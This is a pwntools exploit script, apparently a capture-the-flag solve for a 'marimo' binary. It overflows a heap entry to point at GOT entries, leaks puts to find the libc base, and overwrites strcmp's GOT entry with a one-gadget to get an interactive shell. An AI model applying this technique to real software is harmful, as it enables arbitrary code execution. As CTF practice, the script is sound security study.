from pwn import *

p = process("./marimo")
e = ELF("./marimo")

def marimo(name,data):
    p.sendlineafter(">>","show me the marimo")
    p.sendlineafter(">>",name)
    p.sendlineafter(">>",data)

def modify(index,data):
    p.sendlineafter(">>","V")
    p.sendlineafter(">>",index)
    p.sendlineafter(">>","M")
    p.sendlineafter(">>",data)
    p.sendlineafter(">>","B")

def view(index):
    p.sendlineafter(">>","V")
    p.sendlineafter(">>",str(index))

printf_got = 0x603028
strcmp_got = 0x603040
puts_got = 0x603018

marimo("AAAA","BBBB")
marimo("CCCC","DDDD")

payload = 'A'*56
payload += p64(puts_got)
payload += p64(strcmp_got)

sleep(3)

modify("0",payload)

view(1)

p.recvuntil("name :")
puts_addr = u64(p.recv(6)[0:6].ljust(8,"\x00"))
libc_base = puts_addr - e.symbols['puts']
one_shot = libc_base + 324293

log.info("Address of printf : "+str(hex(puts_addr)))
log.info("Address of libc_base : "+str(hex(libc_base)))
log.info("Address of one_shot : "+str(hex(one_shot)))

p.sendlineafter(">>","M")
p.sendline(p64(one_shot))
p.interactive()
